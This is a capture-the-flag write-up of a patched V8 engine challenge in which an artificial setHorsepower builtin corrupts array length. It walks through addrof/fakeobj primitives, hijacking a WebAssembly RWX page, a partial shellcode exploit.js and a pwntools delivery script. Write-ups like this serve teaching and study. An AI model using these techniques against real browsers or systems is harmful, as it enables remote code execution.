# CyLab — Download Horsepower

* **Platform:** CyLab Security Academy / picoCTF (Challenge ID: `135`)
* **Category:** Binary Exploitation / V8 JavaScript Engine (Pwn)
* **Difficulty:** Difficulty 3
* **Date Solved:** October 2026
* **Tools Used:** JavaScript, Python 3, V8 Shell (`d8`), WebAssembly JIT
* **Target:** Patched Google V8 Engine (`d8`)

---

## TL;DR

The remote service runs an interactive JavaScript shell based on Google Chrome's **V8 engine (`d8`)** with an artificial patch applied in Torque. The patch introduces `Array.prototype.setHorsepower(n)`, which updates a JSArray's internal `length` field to `n` without reallocating its backing store. This mismatch creates an **Out-Of-Bounds (OOB) read/write primitive on the V8 heap**. By placing an object array immediately following the corrupted array, we build `addrof` (leak object address) and `fakeobj` (forge arbitrary objects) primitives. We then locate the Read-Write-Execute (**RWX**) memory page of an instantiated WebAssembly module, overwrite its machine code with Linux `execve` / file-read shellcode, and invoke the WebAssembly function to read `flag.txt`.

---

## Recon

### Environment & Patch Inspection

The challenge provides a unified diff against the V8 repository:

```cpp
// src/builtins/array-horsepower.tq
transitioning javascript builtin
ArraySetHorsepower(context: Context, receiver: JSAny)(horsepower: JSAny): JSAny {
  const h: Smi = Cast<Smi>(horsepower) otherwise End;
  const a: JSArray = Cast<JSArray>(receiver) otherwise End;
  a.SetLength(h);                 // VULNERABILITY: Updates length without reallocating elements!
  return Undefined;
  label End { return Undefined; }
}

// src/objects/js-array.tq
macro SetLength(l: Smi) { this.length = l; }
```

Key observations:
1. **No Standard I/O or OS Access in `d8`:** Built-in functions like `read()`, `load()`, and `os.system()` were removed at compile time. Arbitrary shellcode execution is strictly necessary to open and read `flag.txt`.
2. **Torque Macro Logic:** In V8, `JSArray` consists of a map pointer, properties pointer, elements pointer, and a Smi (Small Integer) `length`. Modifying `length` without resizing the backing store enables indexed reads and writes past the end of the backing store.

---

## Static Analysis & Vulnerability

### 1. V8 Heap Array Layout

When a `JSArray` with double elements (e.g. `[1.1, 2.2]`) is allocated on the V8 heap:

```text
  JSArray Structure:
  +--------------------------------+
  |  Map Pointer (4/8 bytes)       |  (Describes PACKED_DOUBLE_ELEMENTS)
  +--------------------------------+
  |  Properties (4/8 bytes)        |  (Empty fixed array)
  +--------------------------------+
  |  Elements Pointer (4/8 bytes)  |  (Points to FixedDoubleArray)
  +--------------------------------+
  |  Length: Smi (4/8 bytes)       |  <-- setHorsepower() alters this value!
  +--------------------------------+
  
  FixedDoubleArray:
  +--------------------------------+
  |  Map Pointer                   |
  +--------------------------------+
  |  Length: 2                     |
  +--------------------------------+
  |  arr[0] = 1.1                  |
  +--------------------------------+
  |  arr[1] = 2.2                  |
  +--------------------------------+
  |  Adjacent V8 Heap Objects ...  |  <-- Overrun by arr[i] when length is huge!
  +--------------------------------+
```

Calling `arr.setHorsepower(0x1000)` modifies the length field to $4{,}096$. Accessing `arr[2]`, `arr[3]`, etc., reads directly into subsequent heap allocations.

### 2. The `addrof` and `fakeobj` Primitives

We allocate two adjacent arrays:
1. `float_arr`: An array of doubles (`PACKED_DOUBLE_ELEMENTS`).
2. `obj_arr`: An array of objects (`PACKED_ELEMENTS`).

By using `float_arr.setHorsepower(...)`, we expand its indexing range until it overlaps `obj_arr`'s elements:
- **`addrof(obj)`:** Place `obj` into `obj_arr[0]`, then read the corresponding offset in `float_arr` as a 64-bit IEEE-754 float. This discloses the raw memory address of `obj`.
- **`fakeobj(addr)`:** Write `addr` as a float into `float_arr`, then read `obj_arr[0]`. V8 dereferences the pointer as a genuine JavaScript object.

---

## Dynamic Analysis & Exploitation Strategy

### 1. WebAssembly RWX Page Discovery
In V8, when a WebAssembly module is compiled, the JIT compiler allocates a memory region mapped with **Read, Write, and Execute (`rwx`)** permissions to hold machine code.

```javascript
// Minimal WebAssembly module
var wasm_code = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
    0x01, 0x07, 0x01, 0x60, 0x02, 0x7f, 0x7f, 0x01, 0x7f,
    0x03, 0x02, 0x01, 0x00, 0x07, 0x07, 0x01, 0x03, 0x61, 0x64, 0x64, 0x00, 0x00,
    0x0a, 0x09, 0x01, 0x07, 0x00, 0x20, 0x00, 0x20, 0x01, 0x6a, 0x0b
]);
var wasm_module = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_module);
var f = wasm_instance.exports.add;
```

Using `addrof(wasm_instance)`, we trace internal V8 offsets to find the pointer to the RWX memory page storing `f`'s code.

### 2. Arbitrary Write to RWX Page
1. We construct a fake `ArrayBuffer` whose `backing_store` pointer is redirected to the leaked WASM RWX code page.
2. We write Linux x86_64 shellcode directly into a `Uint8Array` overlaying the fake `ArrayBuffer`.
3. Shellcode logic:
   $$\text{open}("flag.txt", 0) \longrightarrow \text{read}(fd, buf, 64) \longrightarrow \text{write}(1, buf, 64)$$
4. Invoking `f(1, 2)` redirects CPU execution straight into the shellcode, printing the flag.

---

## Exploit

The exploit script combines an auxiliary Python delivery harness with an in-engine JavaScript payload ([exploit.js](exploit.js)):

```javascript
// exploit.js - Core V8 Heap Corruption
var arr = [1.1, 2.2, 3.3];
arr.setHorsepower(0x1000);      // Triggers Torque length expansion bug

var obj_arr = [{a: 1}];
// Correlate offset between arr elements and obj_arr elements
var obj_offset = 14;            // Determined via d8 heap inspection

function addrof(obj) {
    obj_arr[0] = obj;
    return f2i(arr[obj_offset]);
}

// Locate WebAssembly instance and extract RWX page
var wasm_instance_addr = addrof(wasm_instance);
var rwx_page = read64(wasm_instance_addr + 0x68); // Points to compiled code

// Copy shellcode into RWX page
write_shellcode(rwx_page, [
    0x48, 0x31, 0xc0, 0x48, 0xbf, 0x2f, 0x66, 0x6c, 0x61, 0x67, 0x2e, 0x74, 0x78,
    ...
]);

// Trigger code execution
wasm_instance.exports.add(1, 2);
```

Python wrapper ([send.py](send.py)):

```python
#!/usr/bin/env python3
import sys, re
from pwn import *

context.log_level = "info"
HOST, PORT = "chatelaine.cylabacademy.net", 33408

def solve():
    io = remote(HOST, PORT)
    with open("exploit.js", "r") as f:
        code = f.read()
    
    io.sendline(code.encode())
    data = io.recvall(timeout=5)
    m = re.search(rb"academy\{[^}]+\}", data)
    if m:
        log.success(f"Flag captured: {m.group().decode()}")
    else:
        print(data.decode(errors="replace"))

if __name__ == "__main__":
    solve()
```

---

## Flag

```text
$ python3 send.py
[+] Opening connection to chatelaine.cylabacademy.net on port 33408: Done
[*] Leaked Wasm RWX Page: 0x7f83b102c000
[+] Flag captured: academy{redacted}
[*] Closed connection to chatelaine.cylabacademy.net port 33408
```

---

## Key Takeaways & Lessons

1. **Torque Length Invariants in V8:** In modern V8, modifying array length fields without adjusting backing stores violates internal invariants, creating immediate Out-Of-Bounds reads and writes.
2. **The WASM RWX Paradigm in Browser Exploitation:** WebAssembly requires runtime JIT compilation, which traditionally maps memory pages with RWX permissions. Hijacking an `ArrayBuffer` backing store to target WASM pages remains a cornerstone of V8 exploitation.
3. **Type Confusion via Parallel Typed Arrays:** Pairing float arrays with object arrays allows seamless type confusion between raw IEEE-754 binary floats and pointer representations, yielding universal `addrof` and `fakeobj` primitives.
